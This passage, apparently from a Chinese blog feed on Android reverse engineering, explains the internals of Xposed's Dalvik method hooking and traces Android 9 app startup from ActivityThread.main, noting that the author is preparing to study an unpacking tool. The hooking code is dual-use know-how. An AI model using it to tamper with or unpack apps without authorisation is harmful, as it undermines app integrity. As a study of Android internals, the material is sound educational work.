class="built_in">memcpy</span>(hookInfo, method, <span class="built_in">sizeof</span>(hookInfo-&gt;originalMethodStruct));</span><br><span class="line">    hookInfo-&gt;reflectedMethod = <span class="built_in">dvmDecodeIndirectRef</span>(<span class="built_in">dvmThreadSelf</span>(), env-&gt;<span class="built_in">NewGlobalRef</span>(reflectedMethodIndirect));</span><br><span class="line">    hookInfo-&gt;additionalInfo = <span class="built_in">dvmDecodeIndirectRef</span>(<span class="built_in">dvmThreadSelf</span>(), env-&gt;<span class="built_in">NewGlobalRef</span>(additionalInfoIndirect));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换函数方法 , 让nativeFunction指向本地的hookedMethodCallback</span></span><br><span class="line">    <span class="built_in">SET_METHOD_FLAG</span>(method, ACC_NATIVE);</span><br><span class="line">    method-&gt;nativeFunc = &amp;hookedMethodCallback;</span><br><span class="line">    method-&gt;insns = (<span class="type">const</span> u2*) hookInfo;</span><br><span class="line">    method-&gt;registersSize = method-&gt;insSize;</span><br><span class="line">    method-&gt;outsSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PTR_gDvmJit != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// reset JIT cache</span></span><br><span class="line">        <span class="type">char</span> currentValue = *((<span class="type">char</span>*)PTR_gDvmJit + <span class="built_in">MEMBER_OFFSET_VAR</span>(DvmJitGlobals,codeCacheFull));</span><br><span class="line">        <span class="keyword">if</span> (currentValue == <span class="number">0</span> || currentValue == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">MEMBER_VAL</span>(PTR_gDvmJit, DvmJitGlobals, codeCacheFull) = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">ALOGE</span>(<span class="string">&quot;Unexpected current value for codeCacheFull: %d&quot;</span>, currentValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对 vm 不熟悉的，解释一下几个不怎么常用的函数。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dvmDecodeIndirectRef</td>
<td>将间接引用 jobject 转换为对象引用 Object*</td>
</tr>
<tr>
<td>dvmSlotToMethod</td>
<td>根据偏移量，从 ClassLoader 中获取函数指针</td>
</tr>
</tbody></table>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">  * hook方法调用时的回调</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hookedMethodCallback</span><span class="params">(<span class="type">const</span> u4* args, JValue* pResult, <span class="type">const</span> Method* method, ::Thread* self)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isMethodHooked</span>(method)) &#123;</span><br><span class="line">        <span class="built_in">dvmThrowNoSuchMethodError</span>(<span class="string">&quot;Could not find Xposed original method - how did you even get here?&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    XposedHookInfo* hookInfo = (XposedHookInfo*) method-&gt;insns;</span><br><span class="line">    Method* original = (Method*) hookInfo;</span><br><span class="line">    Object* originalReflected = hookInfo-&gt;reflectedMethod;</span><br><span class="line">    Object* additionalInfo = hookInfo-&gt;additionalInfo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convert/box arguments</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* desc = &amp;method-&gt;shorty[<span class="number">1</span>]; <span class="comment">// [0] is the return type.</span></span><br><span class="line">    Object* thisObject = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> srcIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> dstIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for non-static methods determine the &quot;this&quot; pointer</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">dvmIsStaticMethod</span>(original)) &#123;</span><br><span class="line">        thisObject = (Object*) args[<span class="number">0</span>];</span><br><span class="line">        srcIndex++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ArrayObject* argsArray = <span class="built_in">dvmAllocArrayByClass</span>(objectArrayClass, <span class="built_in">strlen</span>(method-&gt;shorty) - <span class="number">1</span>, ALLOC_DEFAULT);</span><br><span class="line">    <span class="keyword">if</span> (argsArray == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*desc != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="type">char</span> descChar = *(desc++);</span><br><span class="line">        JValue value;</span><br><span class="line">        Object* obj;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (descChar) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">            value.i = args[srcIndex++];</span><br><span class="line">            obj = (Object*) <span class="built_in">dvmBoxPrimitive</span>(value, <span class="built_in">dvmFindPrimitiveClass</span>(descChar));</span><br><span class="line">            <span class="built_in">dvmReleaseTrackedAlloc</span>(obj, self);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line">            value.j = <span class="built_in">dvmGetArgLong</span>(args, srcIndex);</span><br><span class="line">            srcIndex += <span class="number">2</span>;</span><br><span class="line">            obj = (Object*) <span class="built_in">dvmBoxPrimitive</span>(value, <span class="built_in">dvmFindPrimitiveClass</span>(descChar));</span><br><span class="line">            <span class="built_in">dvmReleaseTrackedAlloc</span>(obj, self);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            obj  = (Object*) args[srcIndex++];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">ALOGE</span>(<span class="string">&quot;Unknown method signature description character: %c&quot;</span>, descChar);</span><br><span class="line">            obj = <span class="literal">NULL</span>;</span><br><span class="line">            srcIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">setObjectArrayElement</span>(argsArray, dstIndex++, obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用Java中的对应方法，即之前我们用到，的handleHookedMethod</span></span><br><span class="line">    JValue result;</span><br><span class="line">    <span class="built_in">dvmCallMethod</span>(self, xposedHandleHookedMethod, <span class="literal">NULL</span>, &amp;result,</span><br><span class="line">        originalReflected, (<span class="type">int</span>) original, additionalInfo, thisObject, argsArray);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dvmReleaseTrackedAlloc</span>(argsArray, self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exceptions are thrown to the caller</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dvmCheckException</span>(self)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return result with proper type</span></span><br><span class="line">    ClassObject* returnType = <span class="built_in">dvmGetBoxedReturnType</span>(method);</span><br><span class="line">    <span class="keyword">if</span> (returnType-&gt;primitiveType == PRIM_VOID) &#123;</span><br><span class="line">        <span class="comment">// ignored</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result.l == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dvmIsPrimitiveClass</span>(returnType)) &#123;</span><br><span class="line">            <span class="built_in">dvmThrowNullPointerException</span>(<span class="string">&quot;null result when primitive expected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pResult-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">dvmUnboxPrimitive</span>(result.l, returnType, pResult)) &#123;</span><br><span class="line">            <span class="built_in">dvmThrowClassCastException</span>(result.l-&gt;clazz, returnType);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>转载：<a href="https://blog.csdn.net/yzzst/article/details/47659987">https://blog.csdn.net/yzzst/article/details/47659987</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>从ActivityThread.main开始分析android应用的启动过程</title>
    <url>/2020/06/20/%E4%BB%8EActivityThread-main%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90android%E5%BA%94%E7%94%A8%E7%9A%84%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>最近准备学习一下 <a href="https://github.com/hanbinglengyue/FART">FART</a> 的源码及其相关文章的过程中发现绕不开 Android 应用的启动过程，所以准备阅读一下 android 的源码，了解一下相关知识。</p>
<p>本文研究的源码为 Android 9 。</p>
<!-- TOC -->

<ul>
<li><a href="#activitythreadmain">ActivityThread.main</a></li>
<li><a href="#activitythreadattach">ActivityThread.attach</a></li>
<li><a href="#activitymanagerserviceattachapplication">ActivityManagerService.attachApplication</a></li>
<li><a href="#activitymanagerserviceattachapplicationlocked">ActivityManagerService.attachApplicationLocked</a></li>
<li><a href="#activitythreadapplicationthreadbindapplication">ActivityThread.ApplicationThread.bindApplication</a></li>
<li><a href="#activitythreadhandlebindapplication">ActivityThread.handleBindApplication</a></li>
<li><a href="#activitymanagerserviceattachapplicationlocked-1">ActivityManagerService.attachApplicationLocked</a></li>
<li><a href="#activitystacksupervisorrealstartactivitylocked">ActivityStackSupervisor.realStartActivityLocked</a></li>
<li><a href="#transactionexecutorexecute">TransactionExecutor.execute</a></li>
<li><a href="#activitythreadhandlelaunchactivity">ActivityThread.handleLaunchActivity</a></li>
<li><a href="#instrumentationcallactivityoncreate">Instrumentation.callActivityOnCreate</a></li>
</ul>
<!-- /TOC -->

<h1 id="ActivityThread-main"><a href="#ActivityThread-main" class="headerlink" title="ActivityThread.main"></a>ActivityThread.main</h1><p>在 <code>ActivityThread.main</code> 方法中对 <code>ActivityThread</code> 进行了初始化，创建了主线程的 <code>Looper</code> 对象并调用 <code>Looper.loop()</code> 方法启动 Looper，把自定义 Handler 类 H 的对象作为主线程的 handler 。接下来跳转到 <code>ActivityThread.attach</code> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    // 创建 ActivityThread 实例</span><br><span class="line">    ActivityThread thread = new ActivityThread();</span><br><span class="line">    // 完成一系列初始化工作，需要跟进分析</span><br><span class="line">    thread.attach(false, startSeq);</span><br><span class="line"></span><br><span class="line">    if (sMainThreadHandler == null) &#123;</span><br><span class="line">        sMainThreadHandler = thread.getHandler();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (false) &#123;</span><br><span class="line">        Looper.myLooper().setMessageLogging(new</span><br><span class="line">                LogPrinter(Log.DEBUG, &quot;ActivityThread&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // End of event ActivityThreadMain.</span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">    //// 主线程进入消息循环</span><br><span class="line">    Looper.loop();</span><br><span class="line"></span><br><span class="line">    throw new RuntimeException(&quot;Main thread loop unexpectedly exited&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ActivityThread-attach"><a href="#ActivityThread-attach" class="headerlink" title="ActivityThread.attach"></a>ActivityThread.attach</h1><p>在 <code>ActivityThread.attach</code> 方法中，会通过 <code>ActivityManagerService</code> 为这个应用绑定一个 <code>Application</code> , 这里的关键方法为 <code>attachApplication</code> , 我们需要进一步跟进。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">private void attach(boolean system, long startSeq) &#123;</span><br><span class="line">    sCurrentActivityThread = this;</span><br><span class="line">    mSystemThread = system;</span><br><span class="line">    if (!system) &#123;</span><br><span class="line">        ViewRootImpl.addFirstDrawHandler(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                ensureJitEnabled();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        android.ddm.DdmHandleAppName.setAppName(&quot;&lt;pre-initialized&gt;&quot;,</span><br><span class="line">                                                UserHandle.myUserId());</span><br><span class="line">        RuntimeInit.setApplicationObject(mAppThread.asBinder());</span><br><span class="line"></span><br><span class="line">        // 获得AMS(ActivityManagerService)实例, AMS的log tag: &quot;ActivityManager&quot;</span><br><span class="line">        final IActivityManager mgr = ActivityManager.getService();</span><br><span class="line">        try &#123;</span><br><span class="line">            // 把 ApplicationThread 对象传给AMS</span><br><span class="line">            mgr.attachApplication(mAppThread, startSeq);</span><br><span class="line">        &#125; catch (RemoteException ex) &#123;</span><br><span class="line">            throw ex.rethrowFromSystemServer();</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ActivityManagerService-attachApplication"><a href="#ActivityManagerService-attachApplication" class="headerlink" title="ActivityManagerService.attachApplication"></a>ActivityManagerService.attachApplication</h1><p>这个方法没什么好看的，直接无脑跟进 <code>attachApplicationLocked</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</span><br><span class="line"></span><br><span class="line">public final void attachApplication(IApplicationThread thread, long startSeq) &#123;</span><br><span class="line">    synchronized (this) &#123;</span><br><span class="line">        int callingPid = Binder.getCallingPid();</span><br><span class="line">        final int callingUid = Binder.getCallingUid();</span><br><span class="line">        final long origId = Binder.clearCallingIdentity();</span><br><span class="line">        //继续跟进</span><br><span class="line">        attachApplicationLocked(thread, callingPid, callingUid, startSeq);</span><br><span class="line">        Binder.restoreCallingIdentity(origId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ActivityManagerService-attachApplicationLocked"><a href="#ActivityManagerService-attachApplicationLocked" class="headerlink" title="ActivityManagerService.attachApplicationLocked"></a>ActivityManagerService.attachApplicationLocked</h1><p>通过 binder , 跨进程调用 ApplicationThread 的 bindApplication() 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</span><br><span class="line"></span><br><span class="line">private final boolean attachApplicationLocked(IApplicationThread thread,</span><br><span class="line">        int pid, int callingUid, long startSeq) &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        else if (app.instr != null) &#123;</span><br><span class="line"></span><br><span class="line">            // 通过 binder , 跨进程调用 ApplicationThread 的 bindApplication() 方法, 下面代码逻辑重回 ActivityThread.java</span><br><span class="line">            thread.bindApplication(processName, appInfo, providers,</span><br><span class="line">                    app.instr.mClass,</span><br><span class="line">                    profilerInfo, app.instr.mArguments,</span><br><span class="line">                    app.instr.mWatcher,</span><br><span class="line">                    app.instr.mUiAutomationConnection, testMode,</span><br><span class="line">                    mBinderTransactionTrackingEnabled, enableTrackAllocation,</span><br><span class="line">                    isRestrictedBackupMode || !normalMode, app.persistent,</span><br><span class="line">                    new Configuration(getGlobalConfiguration()), app.compat,</span><br><span class="line">                    getCommonServicesLocked(app.isolated),</span><br><span class="line">                    mCoreSettingsObserver.getCoreSettingsLocked(),</span><br><span class="line">                    buildSerial, isAutofillCompatEnabled);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            thread.bindApplication(processName, appInfo, providers, null, profilerInfo,</span><br><span class="line">                    null, null, null, testMode,</span><br><span class="line">                    mBinderTransactionTrackingEnabled, enableTrackAllocation,</span><br><span class="line">                    isRestrictedBackupMode || !normalMode, app.persistent,</span><br><span class="line">                    new Configuration(getGlobalConfiguration()), app.compat,</span><br><span class="line">                    getCommonServicesLocked(app.isolated),</span><br><span class="line">                    mCoreSettingsObserver.getCoreSettingsLocked(),</span><br><span class="line">                    buildSerial, isAutofillCompatEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        if (profilerInfo != null) &#123;</span><br><span class="line">            profilerInfo.closeFd();</span><br><span class="line">            profilerInfo = null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ActivityThread-ApplicationThread-bindApplication"><a href="#ActivityThread-ApplicationThread-bindApplication" class="headerlink" title="ActivityThread.ApplicationThread.bindApplication"></a>ActivityThread.ApplicationThread.bindApplication</h1><p><code>bindApplication</code> 最终通过发送消息 <code>BIND_APPLICATION</code> 给 <code>H</code> 处理，然后调用 <code>handleBindApplication</code> 处理该消息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">public final void bindApplication(String processName, ApplicationInfo appInfo,</span><br><span class="line">        List&lt;ProviderInfo&gt; providers, ComponentName instrumentationName,</span><br><span class="line">        ProfilerInfo profilerInfo, Bundle instrumentationArgs,</span><br><span class="line">        IInstrumentationWatcher instrumentationWatcher,</span><br><span class="line">        IUiAutomationConnection instrumentationUiConnection, int debugMode,</span><br><span class="line">        boolean enableBinderTracking, boolean trackAllocation,</span><br><span class="line">        boolean isRestrictedBackupMode, boolean persistent, Configuration config,</span><br><span class="line">        CompatibilityInfo compatInfo, Map services, Bundle coreSettings,</span><br><span class="line">        String buildSerial, boolean autofillCompatibilityEnabled) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // 发消息</span><br><span class="line">    sendMessage(H.BIND_APPLICATION, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">private void sendMessage(int what, Object obj, int arg1, int arg2, boolean async) &#123;</span><br><span class="line">    if (DEBUG_MESSAGES) Slog.v(</span><br><span class="line">        TAG, &quot;SCHEDULE &quot; + what + &quot; &quot; + mH.codeToString(what)</span><br><span class="line">        + &quot;: &quot; + arg1 + &quot; / &quot; + obj);</span><br><span class="line">    Message msg = Message.obtain();</span><br><span class="line">    msg.what = what;</span><br><span class="line">    msg.obj = obj;</span><br><span class="line">    msg.arg1 = arg1;</span><br><span class="line">    msg.arg2 = arg2;</span><br><span class="line">    if (async) &#123;</span><br><span class="line">        msg.setAsynchronous(true);</span><br><span class="line">    &#125;</span><br><span class="line">    //通过mH把BIND_APPLICATION消息发给H处理</span><br><span class="line">    mH.sendMessage(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">public void handleMessage(Message msg) &#123;</span><br><span class="line">    if (DEBUG_MESSAGES) Slog.v(TAG, &quot;&gt;&gt;&gt; handling: &quot; + codeToString(msg.what));</span><br><span class="line">    switch (msg.what) &#123;</span><br><span class="line">        case BIND_APPLICATION:</span><br><span class="line">            Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, &quot;bindApplication&quot;);</span><br><span class="line">            AppBindData data = (AppBindData)msg.obj;</span><br><span class="line">            // 调用ActivityThread的handleBindApplication()方法处理</span><br><span class="line">            handleBindApplication(data);</span><br><span class="line">            Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">            break;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ActivityThread-handleBindApplication"><a href="#ActivityThread-handleBindApplication" class="headerlink" title="ActivityThread.handleBindApplication"></a>ActivityThread.handleBindApplication</h1><p><code>handleBindApplication</code> 开始创建 <code>Application</code> 类相关的的数据，并调用 <code>Application</code> 对象的 <code>attach</code> 和 <code>onCreate</code> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">private void handleBindApplication(AppBindData data) &#123;</span><br><span class="line"></span><br><span class="line">    // 1: 创建LoadedApk对象</span><br><span class="line">    data.info = getPackageInfoNoCheck(data.appInfo, data.compatInfo);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // 2: 创建ContextImpl对象; 并对其进行初始化.</span><br><span class="line">    final ContextImpl appContext = ContextImpl.createAppContext(this, data.info);</span><br><span class="line">    updateLocaleListFromAppContext(appContext,</span><br><span class="line">            mResourcesManager.getConfiguration().getLocales());</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            //  3: 创建 Instrumentation</span><br><span class="line">            final ClassLoader cl = instrContext.getClassLoader();</span><br><span class="line">            mInstrumentation = (Instrumentation)</span><br><span class="line">                cl.loadClass(data.instrumentationName.getClassName()).newInstance();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new RuntimeException(</span><br><span class="line">                &quot;Unable to instantiate instrumentation &quot;</span><br><span class="line">                + data.instrumentationName + &quot;: &quot; + e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        //  4: 创建Application对象;在makeApplication函数中调用了newApplication，</span><br><span class="line">        //  在该函数中又调用了app.attach(context)，在attach函数中调用了Application.attachBaseContext函数</span><br><span class="line">        app = data.info.makeApplication(data.restrictedBackupMode, null);</span><br><span class="line"></span><br><span class="line">       ....</span><br><span class="line">        try &#123;</span><br><span class="line">            // 调Application的生命周期函数 onCreate()</span><br><span class="line">            mInstrumentation.callApplicationOnCreate(app);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        if (!mInstrumentation.onException(app, e)) &#123;</span><br><span class="line">            throw new RuntimeException(</span><br><span class="line">                &quot;Unable to create application &quot; + app.getClass().getName()</span><br><span class="line">                + &quot;: &quot; + e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//frameworks/base/core/java/android/app/LoadedApk.java</span><br><span class="line"></span><br><span class="line">public Application makeApplication(boolean forceDefaultAppClass,</span><br><span class="line">        Instrumentation instrumentation) &#123;</span><br><span class="line">    ...</span><br><span class="line">    try &#123;</span><br><span class="line">        java.lang.ClassLoader cl = getClassLoader();</span><br><span class="line">        if (!mPackageName.equals(&quot;android&quot;)) &#123;</span><br><span class="line">            Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER,</span><br><span class="line">                    &quot;initializeJavaContextClassLoader&quot;);</span><br><span class="line">            initializeJavaContextClassLoader();</span><br><span class="line">            Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">        &#125;</span><br><span class="line">        ContextImpl appContext = ContextImpl.createAppContext(mActivityThread, this);</span><br><span class="line">        // 调用 attch 函数</span><br><span class="line">        app = mActivityThread.mInstrumentation.newApplication(</span><br><span class="line">                cl, appClass, appContext);</span><br><span class="line">        appContext.setOuterContext(app);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    return app;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/Instrumentation.java</span><br><span class="line"></span><br><span class="line">public Application newApplication(ClassLoader cl, String className, Context context)</span><br><span class="line">        throws InstantiationException, IllegalAccessException, </span><br><span class="line">        ClassNotFoundException &#123;</span><br><span class="line">    Application app = getFactory(context.getPackageName())</span><br><span class="line">            .instantiateApplication(cl, className);</span><br><span class="line">    app.attach(context);</span><br><span class="line">    return app;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/Instrumentation.java</span><br><span class="line"></span><br><span class="line">public void callApplicationOnCreate(Application app) &#123;</span><br><span class="line">    app.onCreate();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>至此整个 <code>Application</code> 类的流程就结束了，下面将继续跟进 Activity 的流程 。</p>
<h1 id="ActivityManagerService-attachApplicationLocked-1"><a href="#ActivityManagerService-attachApplicationLocked-1" class="headerlink" title="ActivityManagerService.attachApplicationLocked"></a>ActivityManagerService.attachApplicationLocked</h1><p>回到 <code>attachApplicationLocked</code> 方法，继续向下跟，可以发现一段注释 <code>See if the top visible activity is waiting to run in this process</code> , 这里就是调用 <code>Activity</code> 的关键, 跟进 <code>mStackSupervisor.attachApplicationLocked</code> 后，发现关键方法为 <code>realStartActivityLocked</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</span><br><span class="line"></span><br><span class="line">private final boolean attachApplicationLocked(IApplicationThread thread,</span><br><span class="line">        int pid, int callingUid, long startSeq) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // See if the top visible activity is waiting to run in this process...</span><br><span class="line">    if (normalMode) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 开始调用 activity 的 oncreate 方法</span><br><span class="line">            if (mStackSupervisor.attachApplicationLocked(app)) &#123;</span><br><span class="line">                didSomething = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Slog.wtf(TAG, &quot;Exception thrown launching activities in &quot; + app, e);</span><br><span class="line">            badApp = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/services/core/java/com/android/server/am/ActivityStackSupervisor.java</span><br><span class="line"></span><br><span class="line">boolean attachApplicationLocked(ProcessRecord app) throws RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (realStartActivityLocked(activity, app,</span><br><span class="line">            top == activity /* andResume */, true /* checkConfig */)) &#123;</span><br><span class="line">        didSomething = true;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    return didSomething;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="ActivityStackSupervisor-realStartActivityLocked"><a href="#ActivityStackSupervisor-realStartActivityLocked" class="headerlink" title="ActivityStackSupervisor.realStartActivityLocked"></a>ActivityStackSupervisor.realStartActivityLocked</h1><p>在 <code>realStartActivityLocked</code> 创建了一个 <code>activity launch transaction</code>, 然后再调用 <code>scheduleTransaction</code> 来实现将 <code>EXECUTE_TRANSACTION</code> 消息发送给 <code>ActivityThread.H</code> 进行处理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/services/core/java/com/android/server/am/ActivityStackSupervisor.java</span><br><span class="line">final boolean realStartActivityLocked(ActivityRecord r, ProcessRecord app,</span><br><span class="line">        boolean andResume, boolean checkConfig) throws RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // Create activity launch transaction.</span><br><span class="line">    final ClientTransaction clientTransaction = ClientTransaction.obtain(app.thread,</span><br><span class="line">            r.appToken);</span><br><span class="line">    clientTransaction.addCallback(LaunchActivityItem.obtain(new Intent(r.intent),</span><br><span class="line">            System.identityHashCode(r), r.info,</span><br><span class="line">            // TODO: Have this take the merged configuration instead of separate global</span><br><span class="line">            // and override configs.</span><br><span class="line">            mergedConfiguration.getGlobalConfiguration(),</span><br><span class="line">            mergedConfiguration.getOverrideConfiguration(), r.compat,</span><br><span class="line">            r.launchedFromPackage, task.voiceInteractor, app.repProcState, r.icicle,</span><br><span class="line">            r.persistentState, results, newIntents, mService.isNextTransitionForward(),</span><br><span class="line">            profilerInfo));</span><br><span class="line"></span><br><span class="line">    // Set desired final state.</span><br><span class="line">    final ActivityLifecycleItem lifecycleItem;</span><br><span class="line">    if (andResume) &#123;</span><br><span class="line">        lifecycleItem = ResumeActivityItem.obtain(mService.isNextTransitionForward());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        lifecycleItem = PauseActivityItem.obtain();</span><br><span class="line">    &#125;</span><br><span class="line">    clientTransaction.setLifecycleStateRequest(lifecycleItem);</span><br><span class="line"></span><br><span class="line">    // Schedule transaction.</span><br><span class="line">    